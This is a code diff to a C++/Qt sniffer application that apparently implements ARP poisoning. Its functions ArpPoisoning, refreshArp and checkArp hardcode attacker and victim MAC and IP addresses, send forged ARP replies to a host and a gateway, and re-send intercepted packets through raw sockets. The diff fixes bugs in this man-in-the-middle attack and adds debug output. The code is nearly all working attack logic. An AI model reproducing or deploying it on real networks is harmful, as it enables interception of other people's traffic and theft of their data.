@@ -235,33 +235,33 @@ void                MainWindow::ArpPoisoning()
     mac[0] = 0x60;
     mac[1] = 0x67;
     mac[2] = 0x20;
-    mac[3] = 0x1A;
-    mac[4] = 0xA2;
-    mac[5] = 0xFC;
+    mac[3] = 0x1a;
+    mac[4] = 0xc7;
+    mac[5] = 0xd0;
 
     client_t    *client = new client_t;
-    client->ip = "192.168.43.32";
+    client->ip = "192.168.43.123";
     client->mac[0] = 0x60;
     client->mac[1] = 0x67;
     client->mac[2] = 0x20;
-    client->mac[3] = 0x1A;
-    client->mac[4] = 0xC7;
-    client->mac[5] = 0xD0;
+    client->mac[3] = 0x1a;
+    client->mac[4] = 0xa2;
+    client->mac[5] = 0xfc;
     client1 = client;
-
     client = new client_t;
     client->ip = "192.168.43.1";
     client->mac[0] = 0x98;
-    client->mac[1] = 0x0C;
+    client->mac[1] = 0x0c;
     client->mac[2] = 0x82;
-    client->mac[3] = 0xB0;
-    client->mac[4] = 0xD7;
+    client->mac[3] = 0xb0;
+    client->mac[4] = 0xd7;
     client->mac[5] = 0x68;
     client2 = client;
 }
 
 void            MainWindow::refreshArp()
 {
+    qDebug() << "in";
 #ifdef __linux__
     if (client1 == NULL || client2 == NULL || !this->sniffer->IsSniffing())
         return;
@@ -279,10 +279,13 @@ void            MainWindow::refreshArp()
     client_t    *client = client1;
     for (int i = 0; i < 2; ++i)
     {
-        // From
-        std::memcpy(arp->arp_tha, client, 6);
         // To
-        std::memcpy(arp ->arp_spa, client == client1 ? client2 : client1, strlen(client == client1 ? client2->ip : client1->ip));
+        sscanf((client == client1 ? client2->ip : client1->ip).c_str(), "%d.%d.%d.%d", (int *) &arp->arp_spa[0],
+                                       (int *) &arp->arp_spa[1],
+                                       (int *) &arp->arp_spa[2],
+                                       (int *) &arp->arp_spa[3]);
+        // From
+        std::memcpy(arp->arp_tha, client->mac, 6);
         // By
         std::memcpy(arp->arp_sha, mac, 6);
 
@@ -297,17 +300,20 @@ void            MainWindow::refreshArp()
         arp->ea_hdr.ar_op = htons(ARPOP_REPLY);
 
         memset(&device, 0, sizeof(device));
-        device.sll_ifindex = if_nametoindex(this->interface);
+        device.sll_ifindex = if_nametoindex(this->interface.c_str());
         device.sll_family = AF_PACKET;
         memcpy(device.sll_addr, arp->arp_sha, ETH_ALEN);
         device.sll_halen = htons(ETH_ALEN);
 
-        sendto(sock, packet, PKTLEN, 0, (struct sockaddr *) &device, sizeof(device));
+        qDebug() << sendto(sock, packet, PKTLEN, 0, (struct sockaddr *) &device, sizeof(device));
+        perror("eded : ");
+        qDebug() << this->interface.c_str();
+        client = client2;
     }
 
-    closesocket(socket);
-    }
+    ::close(sock);
 #endif
+    qDebug() << "out";
 }
 
 void    MainWindow::checkArp(SniffedPacket &packet)
@@ -315,8 +321,12 @@ void    MainWindow::checkArp(SniffedPacket &packet)
     if (client1 == NULL || client2 == NULL || !packet.has_ether_hdr)
         return;
 
-    eth_hdr_t *eth = packet.data;
-    if (eth->ether_dhost != mac)
+    QByteArray array = QByteArray(packet.data + 6, 6);
+    QByteArray array2 = QByteArray(mac, 6);
+    qDebug() << QString(array.toHex()) << " = " << QString(array2.toHex());
+
+    eth_hdr_t *eth = (eth_hdr_t *) packet.data;
+    if (strncmp(eth->ether_dhost, mac, 6))
         return;
 
     if (!(client1->ip == packet.ip_source && client2->ip == packet.ip_dest) &&
@@ -336,7 +346,7 @@ void    MainWindow::checkArp(SniffedPacket &packet)
 
     sin.sin_family = AF_INET;
     sin.sin_port = 0;
-    sin.sin_addr.s_addr = ip->ip_srcaddr;
+    sin.sin_addr.s_addr = ip->ip_destaddr;
 
     if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, (char *) val, sizeof(one)) < 0)
         return;
@@ -345,7 +355,7 @@ void    MainWindow::checkArp(SniffedPacket &packet)
     sendto(sd, packet.data, packet.size, 0, (struct sockaddr *)&sin, sizeof(sin));
     closesocket(sd);
  #elif __linux__
-    sendto(sd, packet.data + ETHER_HDR_SIZE, packet.size - ETHER_HDR_SIZE, 0, (struct sockaddr *)&sin, sizeof(sin));
-    close(sd);
+    qDebug() << sendto(sd, packet.data + ETHER_HDR_SIZE, packet.size - ETHER_HDR_SIZE, 0, (struct sockaddr *)&sin, sizeof(sin));
+    ::close(sd);
  #endif
 }
